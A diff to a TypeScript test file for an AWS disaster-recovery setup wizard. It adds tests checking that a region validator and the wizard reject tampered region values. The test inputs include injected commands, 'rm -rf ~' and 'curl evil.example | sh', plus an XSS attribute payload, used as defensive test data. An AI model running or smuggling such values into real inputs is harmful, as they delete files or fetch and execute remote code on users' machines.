@@ -2,7 +2,7 @@ import { fireEvent, render, screen, waitFor, within } from '@testing-library/rea
 import { afterEach, describe, expect, test, vi } from 'vitest';
 import type { ReplicationCapability, ReplicationStatus } from '../../domain/dr';
 import ConnectAwsWizard from './ConnectAwsWizard';
-import { agentCommands, tfvars } from './setup';
+import { agentCommands, isDrsRegion, tfvars } from './setup';
 
 const ENDPOINT = { url: 'https://abc.supabase.co', anonKey: 'anon-key', isLocal: false };
 const TOKEN = 'avi_' + 'a'.repeat(48);
@@ -61,6 +61,14 @@ describe('setup helpers', () => {
     expect(blank).toContain('ingest_token         = "PASTE_THE_TOKEN_YOU_SAVED"');
   });
 
+  test('only offered regions are accepted', () => {
+    expect(isDrsRegion('us-east-2')).toBe(true);
+    expect(isDrsRegion('us-east-2; rm -rf ~')).toBe(false);
+    expect(isDrsRegion('x" onmouseover="alert(1)')).toBe(false);
+    expect(isDrsRegion(42)).toBe(false);
+    expect(isDrsRegion(undefined)).toBe(false);
+  });
+
   test('agent commands use the region-specific installer and short-lived credentials', () => {
     const { linux, windows } = agentCommands('us-east-2');
     expect(linux).toContain(
@@ -87,6 +95,22 @@ describe('ConnectAwsWizard', () => {
     expect(screen.getByTestId('setup-progress')).toHaveTextContent('1 of 6 steps done');
     expect(screen.getByRole('combobox')).toHaveValue('us-east-2');
     expect(screen.getByTestId('setup-step-1')).toHaveAttribute('data-done', 'true');
+  });
+
+  test('a tampered stored region is ignored, not put into links or commands', () => {
+    window.localStorage.setItem(
+      'aethervault:aws-setup:org-1',
+      JSON.stringify({ region: 'us-east-1&x=1; curl evil.example | sh', done: 'nope' }),
+    );
+    renderWizard();
+    expect(screen.getByRole('combobox')).toHaveValue('us-west-2');
+    expect(screen.getByText(/aws drs initialize-service --region us-west-2/)).toBeInTheDocument();
+    expect(screen.queryByText(/evil\.example/)).not.toBeInTheDocument();
+    expect(screen.getByRole('link', { name: /Open Elastic Disaster Recovery/ })).toHaveAttribute(
+      'href',
+      'https://console.aws.amazon.com/drs/home?region=us-west-2',
+    );
+    expect(screen.getByTestId('setup-progress')).toHaveTextContent('0 of 6 steps done');
   });
 
   test('creating the token puts it into the Terraform settings, shown once', async () => {
